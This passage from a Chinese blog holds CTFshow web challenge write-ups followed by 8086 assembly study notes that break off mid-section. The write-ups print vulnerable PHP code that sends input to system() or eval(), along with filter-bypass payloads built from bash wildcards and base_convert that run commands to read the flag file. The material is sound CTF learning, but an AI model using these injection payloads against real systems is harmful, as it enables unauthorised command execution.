<code>#</code></p><p>于是 <code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code> -&gt; <code>$&#123;PWD::$&#123;##&#125;&#125;</code>构造 payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?$&#123;PWD:~N&#125; ????????<br></code></pre></td></tr></table></figure><h1 id="Web-121"><a href="#Web-121" class="headerlink" title="Web 121"></a>Web 121</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ban 了很多，但是还是能用 <code>PWD</code> ，用  <code>/???/r??</code> 构造出路径  <code>bin/rev</code>  执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????????<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;galf&quot;</span> | rev<br></code></pre></td></tr></table></figure><h1 id="Web-122"><a href="#Web-122" class="headerlink" title="Web 122"></a>Web 122</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><code>PWD</code> 和 <code>#</code> 都不能用了，hint 给的</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">通过<span class="hljs-variable">$?</span>来实现的，<span class="hljs-variable">$?</span>是表示上一条命令执行结束后的传回值。通常<span class="hljs-number">0</span>代表执行成功，非<span class="hljs-number">0</span>代表执行有误<br><br><span class="hljs-symbol">payload:</span>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-comment">#可能存在成功的机会，不断刷新</span><br></code></pre></td></tr></table></figure><p>随机，一直刷新就能出来</p><p><code>&lt;A</code> 是将 A 文件夹内的命令重定向到终端进行执行，由于没有文件 A 肯定就会报错，那么 <code>$?</code> 就为 1，用 <code>$&#123;HOME::$?&#125;</code> 得到 <code>/</code>，再用 <code>RANDOM</code> 随机数随机到 4 就能执行 <code>/bin/base64</code></p><h1 id="Web-124"><a href="#Web-124" class="headerlink" title="Web 124"></a>Web 124</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: 收集自网络<br># @Date:   2020-09-16 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-06 14:04:45<br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[&#x27;c&#x27;]))&#123;<br>    show_source(__FILE__);<br>&#125;else&#123;<br>    //例子 c=20-1<br>    $content = $_GET[&#x27;c&#x27;];<br>    if (strlen($content) &gt;= 80) &#123;<br>        die(&quot;太长了不会算&quot;);<br>    &#125;<br>    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];<br>    foreach ($blacklist as $blackitem) &#123;<br>        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的字符&quot;);<br>        &#125;<br>    &#125;<br>    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp<br>    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];<br>    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  <br>    foreach ($used_funcs[0] as $func) &#123;<br>        if (!in_array($func, $whitelist)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的函数&quot;);<br>        &#125;<br>    &#125;<br>    //帮你算出答案<br>    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>只能用白名单里的这些函数，都是一些 Math 函数，里面有很多进制转换的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">base_convert-在任意进制之间转换数字<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$num</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$from_base</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$to_base</span>): <span class="hljs-keyword">string</span><br><br>bindec-二进制转十进制<br><span class="hljs-title function_ invoke__">bindec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$binary_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br>    <br>decbin-十进制转换为二进制<br><span class="hljs-title function_ invoke__">decbin</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>dechex-十进制转换为十六进制<br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br>    <br>decoct-十进制转换为八进制<br><span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>hexdec-十六进制转换为十进制<br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$hex_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br></code></pre></td></tr></table></figure><p>我们只能构造函数或构造字母，<code>base_convert()</code> 函数能实现任意进制转换，在 36 进制中包含了所有的数字和字母，所以只需要将构造出 <code>hex2bin</code> 函数，然后再用 <code>hexdex</code> 函数转换成十进制，当我们构造的时候需要反过来执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-number">36</span>, <span class="hljs-number">10</span>);<br>&gt;&gt;<span class="hljs-number">37907361743</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;_GET&quot;</span>));<br>&gt;&gt;<span class="hljs-number">1598506324</span><br></code></pre></td></tr></table></figure><p>拿函数作为参数构造出<code>c=$_GET[1]($_GET[2])&amp;1=system&amp;2=cat flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">2</span>&#125;);&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac f*<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CTFshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言</title>
    <link href="/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <url>/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>去年学的东西了，突然看到了，想了一下还是传上来，王爽的《汇编语言》第四版（第一本完全看完的跟计算机有关的书www）</p><span id="more"></span><h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a>1.1 机器语言</h2><h2 id="1-2-汇编语言产生"><a href="#1-2-汇编语言产生" class="headerlink" title="1.2 汇编语言产生"></a>1.2 汇编语言产生</h2><p>汇编语言的主体是汇编指令，汇编指令是机器的助记符。</p><h2 id="1-3-汇编语言的组成"><a href="#1-3-汇编语言的组成" class="headerlink" title="1.3 汇编语言的组成"></a>1.3 汇编语言的组成</h2><p>1.汇编指令（机器码助记符）</p><p>2.伪指令（由编译器）</p><p>3.其他符号（由编译器识别）</p><h2 id="1-4-存储器"><a href="#1-4-存储器" class="headerlink" title="1.4 存储器"></a>1.4 存储器</h2><p>cpu,内存，磁盘</p><h2 id="1-5-指令和数据"><a href="#1-5-指令和数据" class="headerlink" title="1.5 指令和数据"></a>1.5 指令和数据</h2><h2 id="1-6-存储单元"><a href="#1-6-存储单元" class="headerlink" title="1.6 存储单元"></a>1.6 存储单元</h2><p>存储器分为若干个存储单元，从 0 开始编号</p><h2 id="1-7-CPU对存储器进行读写"><a href="#1-7-CPU对存储器进行读写" class="headerlink" title="1.7 CPU对存储器进行读写"></a>1.7 CPU对存储器进行读写</h2><p>CPU 对数据进行读写，需要和外部器件进行信息交互：</p><p><strong>1.存储单元地址（地址信息）</strong></p><p><strong>2.器件的选择，读或写命令（控制信息）</strong></p><p><strong>3.读或写的数据（数据信息）</strong></p><p>连接 CPU 和其他芯片</p><h2 id="1-8-地址总线"><a href="#1-8-地址总线" class="headerlink" title="1.8 地址总线"></a>1.8 地址总线</h2><p>CPU 通过地址总线指定存储单元</p><p>地址总线能传送多少个不同的信息，CPU 就可以对多少个存储单元进行寻址。</p><p>一个 CPU 有 N 根地址总线，则可以说这个 CPU 地址总线宽度为 N，CPU 可以寻找 2 的 N 次方个内存单元。</p><h2 id="1-9-数据总线"><a href="#1-9-数据总线" class="headerlink" title="1.9 数据总线"></a>1.9 数据总线</h2><p>CPU和其他器件的数据传输，数据总线宽度决定了 CPU 和外界的数据传输速度。</p><h2 id="1-10-控制总线"><a href="#1-10-控制总线" class="headerlink" title="1.10 控制总线"></a>1.10 控制总线</h2><p>CPU 对外部器件的控制，控制总线是不同控制线的集合</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1）汇编指令是机器指令的助记符，同机器指令一一对应；</p><p>2）每一种 CPU 都有自己的汇编指令集；</p><p>3）CPU 可以直接使用的信息在存储器中存放；</p><p>4）在存储器中指令和数据没有任何区别，都是二进制信息；</p><p>5）存储单元从零开始存储顺序编号；</p><p>6）一个存储单元可以存储 8 个 bite(b);</p><p>7)每一个 CPU 芯片都有许多管脚，管脚和总线相连。</p><p>​<strong>地址总线宽度决定了 CPU 的寻址能力；</strong></p><p>​<strong>数据总线宽度决定了 CPU 与其他器件进行数据传时的一次数据传输量；</strong></p><p>​<strong>控制总线宽度决定了 CPU 对系统中其他器件的控制能力。</strong></p><h2 id="1-11-主板、接口卡"><a href="#1-11-主板、接口卡" class="headerlink" title="1.11 主板、接口卡"></a>1.11 主板、接口卡</h2><h2 id="1-12-各类存储器芯片"><a href="#1-12-各类存储器芯片" class="headerlink" title="1.12 各类存储器芯片"></a>1.12 各类存储器芯片</h2><p><strong>随机存储器（RAM）、只读存储器（ROM）</strong></p><p>随机存储器 RAM</p><p>装有 BIOS 的 ROM</p><p>接口卡上的 RAM</p><h2 id="1-13各类存储器芯片"><a href="#1-13各类存储器芯片" class="headerlink" title="1.13各类存储器芯片"></a>1.13各类存储器芯片</h2><h5 id="装有-BIOS-的-ROM"><a href="#装有-BIOS-的-ROM" class="headerlink" title="装有 BIOS 的 ROM"></a>装有 BIOS 的 ROM</h5><p>BIOS：基本输入输出系统</p><h2 id="1-15内存地址空间"><a href="#1-15内存地址空间" class="headerlink" title="1.15内存地址空间"></a>1.15内存地址空间</h2><p>存储器在物理上是独立器件，相同点：都通过 CPU 和总线相连，CPU 进行读写时都通过控制线发出内存读写命令。</p><h1 id="二、寄存器（CPU-工作原理）"><a href="#二、寄存器（CPU-工作原理）" class="headerlink" title="二、寄存器（CPU 工作原理）"></a>二、寄存器（CPU 工作原理）</h1><p>一个 16 位寄存器可以存储数据最大值为 2^16-1</p><h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a>2.1 通用寄存器</h2><p>AX 的低八位（0位-7位）构成了 AL 寄存器，高8位（8 位-15 位）构成了 AH 寄存器。</p><p>AH 和 AL 寄存器是可以独立使用的 8 位寄存器。</p><h2 id="2-2-汇编指令"><a href="#2-2-汇编指令" class="headerlink" title="2.2 汇编指令"></a>2.2 汇编指令</h2><p><strong>汇编指令不区分大小写</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,18         将18送入AX中       AX=18<br>mov ah,78将78送入AH                            AH=78<br>add ax,8将寄存器中AX中的数据加上8 AX=AX+8<br>mov ax,bx将BX中的数据送入AX中AX=BX<br>add ax,bx将AX，BX中的内容相加，结果存在AX中AX=AX+BX<br></code></pre></td></tr></table></figure><h2 id="2-3-物理地址"><a href="#2-3-物理地址" class="headerlink" title="2.3 物理地址"></a>2.3 物理地址</h2><p>CPU访问内存单元时给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，这个唯一地址成为物理地址。</p><h2 id="2-4-16-位结构的-CPU"><a href="#2-4-16-位结构的-CPU" class="headerlink" title="2.4 16 位结构的 CPU"></a>2.4 16 位结构的 CPU</h2><p>16 位结构运算器一次最多可以处理 16 位数据，寄存器最大宽度为 16 位，寄存器和运算器之间的通路是 16 位的。</p><p><strong>地址加法器工作原理</strong></p><p>地址加法器合成物理地址的方法：<strong>物理地址&#x3D;段地址x16+偏移地址</strong></p><p>移位次数和各种形式数据关系：几进制左移就乘以几</p><h2 id="2-5-段的概念"><a href="#2-5-段的概念" class="headerlink" title="2.5 段的概念"></a>2.5 段的概念</h2><p>将若干地址连续的内存单元看成一个段</p><p>1）一个段的起始地址一定是 16 的倍数.</p><p>2）偏移地址位 16 位，16 位地址的寻址能力为 64k，所以一个段的最大长度为 64k，    2^16&#x3D;64</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>CPU 访问内存单元时，必须提供物理地址</p><p>CPU 可以通过不同的段地址和偏移地址组成物理地址</p><h2 id="2-6-段寄存器"><a href="#2-6-段寄存器" class="headerlink" title="2.6 段寄存器"></a>2.6 段寄存器</h2><p>段寄存器是提供段地址，8086CPU 有四个段寄存器：CS，DS，SS，ES，当 8086CPU 要访问内存时，由这四个段寄存器提供内存单元的段地址。</p><p>CS 为代码段寄存器，IP 为指令指针寄存器。</p><h2 id="2-7-CS-和-IP"><a href="#2-7-CS-和-IP" class="headerlink" title="2.7 CS 和 IP"></a>2.7 CS 和 IP</h2><p>CPU 将 CS 和 IP 中的内容当作指令的段地址</p><p><strong>CS 存放指令的段地址，IP 存放指令的偏移地址</strong></p><p><strong>同时</strong>修改 CS、IP 的内容：</p><p><strong>jmp 段地址：偏移地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 2AE3:3#跑到2AE33<br><br>jmp 3:0B16#跑到00B46H3=00030<br></code></pre></td></tr></table></figure><p>功能：用指令中给出的段地址修改 CS，偏移地址修改 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">仅修改IP内容：jmp 某一合法寄存器<br><br>jmp ax(类似于mov IP,ax)<br><br>jmp bx<br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,200H      jmp ax<br></code></pre></td></tr></table></figure><p>功能：用寄存器中的值修改 IP</p><h2 id="2-8-代码段"><a href="#2-8-代码段" class="headerlink" title="2.8 代码段"></a>2.8 代码段</h2><p>将一组内存单元定义为一个段</p><p>CPU 只认被 CS：IP 指向的内存单元中的内容为指令</p><h1 id="三、寄存器（内存访问）"><a href="#三、寄存器（内存访问）" class="headerlink" title="三、寄存器（内存访问）"></a>三、寄存器（内存访问）</h1><h2 id="3-1-内存中字的存储"><a href="#3-1-内存中字的存储" class="headerlink" title="3.1 内存中字的存储"></a>3.1 内存中字的存储</h2><p>低地址存低位，高地址存高位</p><p>字型考虑两个字节</p><p>两个连续的内存单元，<strong>N 号单元和 N+1</strong> 可以看成两个内存单元，也可以看成一个地址为 N 的字单元中的高位字节单元和低位字节单元。</p><h2 id="3-2-DS-和-address"><a href="#3-2-DS-和-address" class="headerlink" title="3.2 DS 和 [address]"></a>3.2 DS 和 [address]</h2><p>DS 段寄存器存放要访问数据的段地址</p><p>mov 指令能**1.将数据直接送入寄存器 **</p><p>​<strong>2.将寄存器的内容送入另一个寄存器</strong></p><p>​<strong>3.将内存单元的内容传入一个寄存器</strong></p><p>mov 指令能将<strong>一个内存单元的内容</strong>送入一个寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 寄存器名,内存单元地址<br>e.g   <br>mov bx,1000H<br>mov ds,bx<br>mov a1,[0]//内存单元偏移地址为 0，段地址默认放在 ds 中<br>mov ds,1000H //错误表达<br>8086CPU 不支持直接将数据送入段寄存器操作，用 bx 进行中转<br></code></pre></td></tr></table></figure><p><strong>数据-&gt;通用寄存器-&gt;段寄存器</strong></p><p>内存单元到寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 寄存器名，内存单元地址<br></code></pre></td></tr></table></figure><p>寄存器到内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 内存单元地址，寄存器名<br></code></pre></td></tr></table></figure><p>将 a1 中的数据传入内存单元10000H 中</p><p>10000H-&gt;1000:0 地址1000H，偏移地址为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov [0],a1<br></code></pre></td></tr></table></figure><h2 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3 字的传送"></a>3.3 字的传送</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov ax,[0]//1000:0处的字型数据送入ax<br>mov [0],cx//cx中的16位数据送到1000:0处<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c92c75e501ca30e3.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/e95d6014994bccc2.png"></p><h2 id="3-4-mov、add、sub-指令"><a href="#3-4-mov、add、sub-指令" class="headerlink" title="3.4 mov、add、sub 指令"></a>3.4 mov、add、sub 指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov/add/sub  寄存器，数据mov ax,8<br>mov/add/sub  寄存器，寄存器mov ax,bx<br>mov/add/sub  寄存器，内存单元mov ax,[0]<br>mov/add/sub  内存单元，寄存器mov [0],ax<br>mov/add/sub  段寄存器，寄存器mov ds,ax<br></code></pre></td></tr></table></figure><h2 id="3-5-数据段"><a href="#3-5-数据段" class="headerlink" title="3.5 数据段"></a>3.5 数据段</h2><p>将 123B0H~123B9H 的内存单元定义为数据段，累加这个数据段 的前三个单元的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax//将123BH送入ds中，作为数据段的段地址<br>mov a1,0//用a1存放累加结果<br>add a1,[0]//将数据段第一个单元（偏移地址为0）中的数值加到a1中<br>add a1,[1]//以此类推<br>add a1,[2]<br></code></pre></td></tr></table></figure><p>eg.写几条指令，累加数据段中的前三个字型数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax<br>mov ax,0<br>add ax,[0]<br>add ax,[2]<br>add ax,[4]<br><br>//一个字占两个单元，偏移地址为0，2，4<br></code></pre></td></tr></table></figure><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><ul><li>字在内存中存储时，需要两个连续的内存单元，低位字节放低地址单元中，高位放高地址中</li><li>mov 指令中只给出单元的偏移地址，段地址默认在 DS 寄存器中</li><li>内存和寄存器传字型数据时，高地址单元和高 8 位寄存器、低地址单元和低 8 位寄存器相对应</li><li>mov&#x2F;sub&#x2F;add 有两个操作对象指令，jmp 只有一个</li></ul><h2 id="3-6-栈"><a href="#3-6-栈" class="headerlink" title="3.6 栈"></a>3.6 栈</h2><p>先进后出</p><h2 id="3-7-CPU提供的栈机制"><a href="#3-7-CPU提供的栈机制" class="headerlink" title="3. 7 CPU提供的栈机制"></a>3. 7 CPU提供的栈机制</h2><ul><li><p>8086CPU 入栈和出栈都是以<strong>字</strong>为单位的</p></li><li><p>push ax 是将寄存器的数据送入栈中，pop ax 表示从栈顶取出数据送入 ax</p></li><li><p>段寄存器 SS 和寄存器 SP，<strong>栈顶的段地址存放在 SS 中，偏移地址存放在SP中</strong>，CPU 从 SS 和 SP 中得到栈顶的地址</p></li><li><p><strong>任意时刻，SS:SP 指向栈顶元素</strong></p></li></ul><h5 id="push-ax-执行步骤："><a href="#push-ax-执行步骤：" class="headerlink" title="push ax 执行步骤："></a>push ax 执行步骤：</h5><p>​1）SP&#x3D;SP-2,SS:SP 